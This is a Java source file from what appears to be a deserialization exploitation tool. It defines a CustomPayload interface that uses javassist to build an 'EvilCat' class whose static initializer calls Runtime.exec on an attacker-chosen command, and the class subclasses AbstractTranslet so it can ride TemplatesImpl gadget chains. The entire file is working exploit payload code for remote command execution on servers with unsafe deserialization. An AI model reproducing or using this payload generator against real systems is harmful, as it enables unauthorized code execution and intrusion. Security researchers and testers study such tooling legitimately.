package com.bcvgh.core.unser.gadgets;

import com.bcvgh.core.unser.core.pojo.UnSerInput;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

public interface CustomPayload extends ObjectPayload {
    default byte[] getCustomBytecode(UnSerInput unSerInput) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\""+ unSerInput.getCommand()+"\");";
        // 创建 static 代码块，并插入代码
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        //如果当前类不属于BcelPayload，动态生成类则不继承AbstractTranslet
        if (!(this instanceof BcelPayload)){
            cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        }
        //
        byte[] bytes = cc.toBytecode();
        return bytes;
    }

}
